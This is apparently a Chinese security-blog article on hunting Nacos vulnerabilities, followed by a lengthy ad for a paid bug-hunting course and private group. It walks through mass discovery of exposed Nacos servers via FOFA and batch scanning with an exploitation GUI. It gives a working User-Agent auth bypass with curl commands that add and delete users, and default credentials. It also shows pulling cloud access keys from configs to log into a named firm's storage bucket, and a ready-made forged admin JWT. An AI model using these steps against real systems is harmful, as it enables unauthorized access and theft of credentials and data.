#  针对Nacos漏洞猎杀的各种骚姿势  
 Say Sec   2026-02-05 01:22  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（课程培训限时优惠）。  
#   
  
  
01  
  
0x1   
针对Nacos漏洞猎杀的各种骚姿势  
## 0x1 NacosExploitGUI自动化工具  
### 浅谈  
  
在攻防演练中，Nacos  
一直是红队攻击的重点目标之一，红队通常需要快速打点，尽快发现系统中  
  
的漏洞，并利用它们获取权限。在NacosExploitGUI_v7.0  
版本中，更新了UI及其各种友好的提  
  
示、新增空间测绘功能让打点资产更迅速、修复derby sql注入漏洞在在特殊场景下的编码问题、  
  
新增derby sql注入不出网RCE的检测及其利用、 修复配置文件提取接口上限的问题、Jraft  
  
Hessian 反序列化漏洞新增自定义group攻击链路、新增自定义注入内存马密码及其路径、新增注  
  
入蚁剑内存马、新增命令执行可反弹shell功能等等。  
  
**NacosExploitGUI自动化工具：**  
  
GitHub - charonlight/NacosExploitGUI: Nacos漏洞综合利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用 Nacos漏洞综合利用GUI工具，集成了默认口令漏洞、SQL注入漏洞、身份认证绕过漏洞、反序列化漏洞的检测及其利用 - charonlight/NacosExploitGUI https://github.com/charonlight/NacosExploitGUI  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetqlUZFFbaemeTSiaBayep14JGBECdHQAllFHqJB9mSgwmiaiaqEiazBssIg/640?wx_fmt=png&from=appmsg "null")  
  
**上面的这个图形化工具支持下面的几种漏洞扫描类型**  
```
Nacos Console 默认口令漏洞Nacos Derby SQL 注入漏洞(CNVD-2020-67618)Nacos User-Agent 权限绕过漏洞(CVE-2021-29441)Nacos serverIdentity 权限绕过漏洞Nacos token.secret.key 默认配置漏洞(QVD-2023-6271)Nacos-Client Yaml 反序列化漏洞Nacos Jraft Hessian 反序列化漏洞(CNVD-2023-45001)
```  
  
师傅们可以看下下面的，就是使用工具进行批量的一个漏洞扫描，可以看到能够扫描到很多的漏洞，其中默认配置漏洞以及默认弱口令漏洞是最为常见的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxettNrMtB0icgicIh5N8wprWZ70kEnwt3cX7UeOCy32kjxvdNabbN2BTLMw/640?wx_fmt=png&from=appmsg "null")  
## 0x2 漏洞猎杀  
### 相关漏洞资产收集  
  
像比如师傅们不知道怎么找**nacos相关漏洞**  
的话，其实师傅们就可以直接使用空间检索引擎进行检索，比如常用的就是使用这个**icon**  
图标去找相关漏洞，因为很多nacos框架网站并不一定进行了魔改，所以可以使用icon图标进行资产收集，是最简单的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetDoia4lsWoqwIA7XeZU0eZOWhUxxzJg9wyLZmYCy92Gk5XwNcy7t7aTg/640?wx_fmt=png&from=appmsg "null")  
  
然后就可以使用空间引擎，下面我使用鹰图给师傅们演示下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetLMNtBrVFEMM2oTsjZqNkTvlgMRmvIM4Ul21akgMpiav4pDzEa2UUAXA/640?wx_fmt=png&from=appmsg "null")  
  
还有一种方法就是使用FOFA空间语法进行检索相关资产信息  
  
**FOFA语句:app="nacos" && port="8848"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetcF4qbXmfUCdUxp5FZicgyecBGicQIHIVWRWW2EZJ6ZcSWficB4lTTXoSQ/640?wx_fmt=png&from=appmsg "null")  
  
下面可以看到icon图标，除了开始我们上面的一种，下面还有好几个，  
  
然后看下面的独立IP数量，有上万个，数量很多，那么我们就可以使用自动化扫描工具了，就比如使用我们上面的NacosExploitGUI自动化工具进行批量漏洞匹配  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetnbSiatmqtn984KQ8MUj8ro1BPRVpicc95sfqshRAjP8iclBxlYrzFHtFQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetZME7icf4X3V9h7hmkibAHsckcyZBszwy4soHZF3cxRZPXpkankwj7Nkw/640?wx_fmt=png&from=appmsg "null")  
  
然后确定完漏洞以后，就可以直接进行挨个测试了，比如弱口令进去的，那么就可以进行然后再后台进行一个漏洞测试，扩大危害。  
### 漏洞一：User-Agent权限绕过（CVE-2021-29441）  
  
漏洞描述: 该漏洞发生在nacos在进行认证授权操作时，会判断请求的user-agent是否为”Nacos-Server”，如果是的话则不进行任何认证。开发者原意是用来处理一些服务端对服务端的请求。但是由于配置的过于简单，并且将协商好的user-agent设置为Nacos-Server，直接硬编码在了代码里，导致了漏洞的出现。  
  
漏洞影响版本: Nacos <= 2.0.0-ALPHA.1  
  
直接访问下面的目录，可以未授权查看到账号密码  
```
/v1/auth/users?pageNo=1&pageSize=100  //可查看到用户列表
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetNw2t5AEn4F1ppzcoboXjHQ7uDbxKfD3X3DRsuxLMU214lPAZpX0H7g/640?wx_fmt=png&from=appmsg "null")  
  
可以看下里面的账号密码，很多情况下账号密码都是这个暴露出来的username  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetc34SG3kJdibl8ndI2u0duJETicMkN7SlhXPAfwgQlBicoREMBkXrHSUjQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetdYGO38K9ornp42jr9fhFe3AMDmojJ0uwvNTRHqlQkMdnqCg0ibnlb7g/640?wx_fmt=png&from=appmsg "null")  
  
添加用户，访问下面的接口  
```
/v1/auth/users  //添加用户username=hhh&password=123456User-Agent:Nacos-Server
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetRW7DiaQgu3r0ZKQNKkglbAbSCRauXJwosgr0HvXlCGqvQELcgJBNrCA/640?wx_fmt=png&from=appmsg "null")  
```
//查看用户是否添加成功:/v1/auth/search?username=hhhcurl 'http://IP/v1/auth/search?username=hhh'//删除用户curl -X DELETE "http://IP/v1/auth/users?username=hhh"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetxsU9rmeiadY7aQxFJiazJWdXznkrEkr8uJKeOPjpoXvyV5hSF2VCQQkw/640?wx_fmt=png&from=appmsg "null")  
  
然后还可以使用我前面介绍的工具哈，直接就可以进行创建用户和删除用户的操作，十分简单便捷，适用于大批量IP渗透测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxet4rlp4PFic1MEh30uElk2aHntPxfXVj0YxoPJ55ZQJlQl4fd23P8wF1Q/640?wx_fmt=png&from=appmsg "null")  
### 漏洞二：默认弱口令漏洞  
  
nacos框架的默认弱口令直接使用工具刚才检索出来了，直接常用的nacos：nacos登录成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetvRkGBA2NiaYpaYgwx9wwHVdHnVMNtgj3NzIhanv4Cdl3Zx9Elot18QQ/640?wx_fmt=png&from=appmsg "null")  
### 漏洞三：阿里云主机泄露Access Key  
  
然后你可以直接在配置列表中的详情里面查看网站的配置信息，然后去挨个找，因为里面都是云安全的一些环境的配置，里面经常会泄露一些云安全的信息key值等，都是可以进行利用的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetcQAjvJ49Xibs9lp8JlXMiabyBhnG6bNnMedmxfleLwkGlpdIjMcQU4Ag/640?wx_fmt=png&from=appmsg "null")  
  
比如说里面找到OSS储存桶相关的，然后访问下，尝试打个OSS存储桶漏洞，感兴趣的师傅们可以根据我的这个思路进行测试下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetdhkYd7mI3yt3grTodDZ6RuQ1avgz3DJXB7biama111klXkwePXKXNgA/640?wx_fmt=png&from=appmsg "null")  
  
后来我在rokid-ar-security-platform-biz-prod.yml  
配置详情里面找到了这个东西，这个也是OSS储存桶相关的漏洞，下面的url可以访问下，然后要是有回显的话，然后尝试使用下面的access-key和secret-key进行密钥登录  
```
  endpoint: xxxxxxxxxxxxxxx  access-key: xxxxxxxxxxxxxxxxxxxxxxxx  secret-key: xxxxxxxxxxxxxxxxxxxxxxxxxxxx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetdWDzMBudE37DWYuQ6pQug47xLdvqbic7lgtnfaU34NS4nIYvcAQgh5Q/640?wx_fmt=png&from=appmsg "null")  
  
可以看到这里我直接就登录成功了，且里面都是云空间里面的存储东西，下面可以看到里面的日志信息等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetcZT2I8BKfv72ZrLQrZY8jMaEMTzDk4wRqRIneRAB7Q3IfkRLtANkwA/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetwB2meVSkaxpn1IrLCEvCnjxB3CdxAj6kbNLkEKKuvs1aNN5FT6EDlA/640?wx_fmt=png&from=appmsg "null")  
  
有一些他里面你要是没有找到那个访问的url或者访问不了禁止访问登录连接，那么师傅们可以尝试下下面的这个工具oss-browser  
，就是专门来连接OSS的  
  
GitHub - aliyun/oss-browser: OSS Browser 提供类似windows资源管理器功能。用户可以很方便的浏览文件，上传下载文件，支持断点续传等。 OSS Browser 提供类似windows资源管理器功能。用户可以很方便的浏览文件，上传下载文件，支持断点续传等。 - aliyun/oss-browser https://github.com/aliyun/oss-browser  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxet0MrkL4nVXUjRkJDFDwPqPhTrwS0eZbHUevIoibcDaEhby3E8yq2cricw/640?wx_fmt=png&from=appmsg "null")  
  
直接输入泄露的access-key值，直接使用OSS连接工具就可以直接连接成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetyL7fnwVqz9ZticAsrCa0xZRSrUuASdM2wjEVjzs5ibe9iaK0H5qaJG3Sw/640?wx_fmt=png&from=appmsg "null")  
  
包括也会使用阿里云的下面的这个连接工具：**aliyun-accesskey-Tools**  
  
https://github.com/mrknow001/aliyun-accesskey-Tools  
  
**参考文章如下：**  
  
记一次阿里云主机泄露Access Key到Getshell - FreeBuf网络安全行业门户 拿到网站先信息收集了一波，使用的宝塔，没有pma漏洞，其它方面也没有什么漏洞。 https://www.freebuf.com/articles/web/255717.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetEudIVcdKcxZv4ZH6PwNMm8E4lB1dOX6LQG1Xsib5IFO7Sv1ZNgcFOHQ/640?wx_fmt=png&from=appmsg "null")  
  
要是运气好的话们，也就是我们上面的那个直接找到了下面的OSS阿里云主机登录的后台地址，且允许我们直接拿泄露Access Key值进行登录连接，直接可以看到改阿里云服务器云上的所有信息了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetdO3enLeTV7pkxZZHa0D48cVRZdMV6iccnkSO7GRhFpb9g9TvgjBCbKw/640?wx_fmt=png&from=appmsg "null")  
### 漏洞四：token.secret.key默认配置(QVD-2023-6271)  
  
利用刚才的图形化nacos自动化漏洞扫描工具扫出来的一个token.secret.key默认配置(QVD-2023-6271)漏洞，下面就来打下这个洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetfhybmayhmTGvSqib6GeSPiaSExCy7ibeiaOo30AQR7iacyvhUWqwicLMDKeA/640?wx_fmt=png&from=appmsg "null")  
  
使用nacos默认key可进行jwt构造  
  
nacos默认key（token.secret.key值的位置在conf下的application.properties）  
```
SecretKey012345678901234567890123456789012345678901234567890123456789JWT DATA:{  "sub": "nacos",  "exp": 1682308800}
```  
  
SecretKey012345678901234567890123456789012345678901234567890123456789   
利用该key构造JWT，可以直接进入后台。  
  
在：https://jwt.io/  
```
payload：{  "sub": "nacos",  "exp": 1721781819}//1721781819是unix的时间戳 需要比系统晚  一般可以改成明天的时间
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetkIe2cCWkRYYe3xgwO3DqxlARABj8WmKj7ky4YKmEOnznvRTxrFQn1A/640?wx_fmt=png&from=appmsg "null")  
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcyMTc4MTgxOX0.ltShA79EVJaJmhD0zYxtwsx_4K8erjXsorZ5T3RrARw
```  
  
我们先直接随便输入一个账号密码，然后看看登录失败的返回包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetS7q0qF7IQcvS0NoE7rLCJC3EwcSOYn411zzOq4FzWf8N9DljlFIbiag/640?wx_fmt=png&from=appmsg "null")  
  
然后把下面的payload复制到数据包中，就可以成功了  
```
payload：Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcyMTc4MTgxOX0.ltShA79EVJaJmhD0zYxtwsx_4K8erjXsorZ5T3RrARw
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetC1CsyRU0niavWduz4YX99n44iaq0T9FVRvS0qiakyicnnVLSqLOVGicxT1Q/640?wx_fmt=png&from=appmsg "null")  
  
然后再把返回包复制，再利用刚才的网站登录抓包，然后修改返回包，然后放包，就可以直接登录到网站后台了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetxWHQt7qsTiao7AIuiaxZLfGBzandSQJgPA9cNBE2OHQ4kicT4Gqwmg0pw/640?wx_fmt=png&from=appmsg "null")  
### 漏洞五：Spring-Boot漏洞  
  
对于Spring-Boot  
漏洞，我们可以使用Spring-Boot-Scan漏洞扫描工具  
  
GitHub - AabyssZG/SpringBoot-Scan: 针对SpringBoot的开源渗透框架，以及Spring相关高危漏洞利用工具 针对SpringBoot的开源渗透框架，以及Spring相关高危漏洞利用工具. Contribute to AabyssZG/SpringBoot-Scan development by creating an account on GitHub. https://github.com/AabyssZG/SpringBoot-Scan  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetasqXjMOFe1YPXLgJCnnT9JM7gfU3CUD3So76Zjwn9UVdXfs7qy1zcw/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetbvza6XWiacFy88p6kBUnFm40aTIekVvGjhQrnGaIFJI9yzqiaZdFJZFA/640?wx_fmt=png&from=appmsg "null")  
  
然后进入后台里面有spring-boot相关源代码，都是可以进行分析的，感兴趣的十分可以尝试下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy1J7bcYP3B4QhggKfpxetS1ib5MDnJ1ywUoVnqfmTlLOspwoy94uib1wSbqyPKPJoibahIcVKsfVOg/640?wx_fmt=png&from=appmsg "null")  
  
02  
  
0x2 课程背景  
  
哈咯，各位师傅们好久不见！  
神农安全内部小圈子从  
2024年开始搞起来的，到现在也已经有小一两年了，期间承蒙各位师傅们的  
关注和支持  
💗  
非常感谢大家。  
  
「神农安全」知识星球目前已经  
累计1600+网络安全爱好者的加入，在这个过程中收获到了很多师傅们的  
好评与鼓励  
🎉  
，  
内部小圈子：一个知识星球+内部小圈子交流群+知识库。一直一来价格都没有超过50（都给师傅们发优惠卷），基本上加了小圈子的师傅都会说一句——  
“  
这圈子加的真值啊  
”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthLEynEQtMibH6uWjBva44EEEkCx8bX12KA8gsZKQlllwGfyAEiaDHqY8g/640?wx_fmt=other&from=appmsg "")  
  
我平常呢也特别的爱  
分享技术文章，特别是每当学习到一个新技术，我都会去详细认真的写一篇对应的博客文章进行发表。  
活跃于先知社区、FreeBuf、奇安信攻防社区、知乎与CSDN等技术社区，id：  
一个想当文人的黑客，累计发表   
500+篇原创技术文章。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthlexDYBvDy8LwERVHKlbb7086Gm5KFIV78taz23NJicAWpDYA9T4svTA/640?wx_fmt=png&from=appmsg "")  
  
发表的公众号文章也从来没有设置过  
付费模式，哪怕一篇文章写个一个星期左右，好几万个字一篇的文章也都向来如此。喜欢看我写文章的师傅们都知道我写的技术博客文章：要有  
实战案例截图+详细知识点汇总，所以这样也是吸引到了很多师傅们观看我的文章，也是一年时间迅速在网络安全的圈子里面发展了自己的  
内部小圈子  
（成绩也不错）  
🎉  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX3SIic6S4hEtLspuFkYL0w3LaPPsV0u8gXdAC0wuz2xobUIMR9ibfrkKzsgBQ1keNgnuMo3aXuO1ibQ/640?wx_fmt=png&from=appmsg "")  
  
后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想让我开课教下思路，所以想着自己花时间做了  
 ✨  
课件和课表，都是纯自己手搓的，大家也可以看下课表的内容，**课程价格目前是300**  
（后面也会随着人数越多，涨价）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWX3SIic6S4hEtLspuFkYL0w3c0V9SHia9KaMfIRkaRLia8mhrxjITkWvU6UJuibbGmrHe9La4CK96XUeg/640?wx_fmt=png&from=appmsg "")  
  
  
不是小圈子的师傅们报名成功再送内部小圈子（知识星球）一个，都有对应的  
专属微信群聊  
 ✨  
。  
  
一周1-2节课程，**直播+录播形式**  
，课程内容大家可以看课表，目前是第一期，一次报名永久无限听课  
  
目前是第一期课程，后面比如说开了二、三期，都是不用在花钱的  
  
上课结束后，会把**视频录播+课件笔记**  
一起打包发直播群  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthM2sjuWQFbmvWv79V058KwI0DswFF9LysewGtULj81Vp5bX9nTEK78A/640?wx_fmt=png&from=appmsg "")  
  
03  
  
0x3 课程特色  
  
课程  
主打真实，  
一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次  
跳槽涨薪做好准备。本  
课程内容覆盖企业  
SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。  
  
本课程  
适合人群  
（光看不挖啥也不会）  
```
1、想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
```  
  
课程价格：300元  
  
报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群  
```
1、课程价格真心实惠，绝不割韭菜
2、两三百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```  
  
直播培训教学方式  
  
课程  
一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。  
拉微信群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，  
一对一简历优化，助力在岗人员和大学生的能力提升。  
  
一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
课程均为线上交付，报名成功后  
不支持退款  
  
内部小圈子  
（知识星球+内部小圈子交流群+知识库）  
  
对内部小圈子感兴趣的师傅们也可以看下下面的这个  
跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。  
  
[强烈推荐一个永久的SRC挖掘、渗透攻防内部知识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth4VWMmSt5ZBYAUuNNGuEjU3tvKRAN0yqMTPSnzKxibReCfiaFGibLxdAYw/640?wx_fmt=png&from=appmsg "")  
  
讲师介绍  
  
id：一个想当文人的黑客  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthqvGuVSjkR43eeaNibf1KbGU4nia5ibXFYpTBFeAbQewTq43IqJHIMhhhg/640?wx_fmt=png&from=appmsg "")  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
04  
  
0x4   
第一期挖洞培训课表内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVMibw6HiaoHUxJgNHUVfqCicbGSauW0QQBjLcC9H4gdOEyW3ZzLjTfyYibqGdaSueO9GDbbyicmckia2Kg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍（报课赠送）**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
**知识星球——**  
**神农安全**  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=other&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=other&from=appmsg "")  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUbESIpm7ibTY4npJjceHaoE6lkicrweicg40cYjD33cyV4enIt4o3A0Ia9nZxB5icnEicNhetiaiafLnAmg/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
